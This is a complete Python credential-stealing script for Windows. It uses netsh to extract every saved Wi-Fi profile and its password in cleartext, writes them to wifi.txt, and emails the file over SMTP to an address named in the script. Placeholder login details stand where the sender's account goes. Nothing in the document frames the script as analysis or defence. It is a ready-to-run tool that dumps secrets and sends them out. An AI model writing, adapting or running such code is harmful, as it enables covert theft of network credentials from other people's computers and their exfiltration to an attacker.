import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

# Create wifi.txt file and write the profile names and passwords to it
with open('wifi.txt', 'w') as f:
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            f.write("{:<30}|  {:<}\n".format(i, results[0]))
        except IndexError:
            f.write("{:<30}|  {:<}\n".format(i, ""))

# Email the wifi.txt file to a specific email
email_user = 'emailuser@domain.com' #Your Login Email 
email_password = 'xxxx' # Your Email Password
email_send = 'emailaddress@gmail.com' # Where To Send wifi.txt 

subject = 'WiFi Passwords'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'WiFi Passwords'
msg.attach(MIMEText(body, 'plain'))

filename = 'wifi.txt'
attachment = open(filename, 'rb')

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= " + filename)
msg.attach(part)
text = msg.as_string()

server = smtplib.SMTP('smpt.domain.com', 25) # SMTP Server . Port #
server.starttls()
server.login(email_user, email_password)

server.sendmail(email_user, email_send, text)
server.quit()
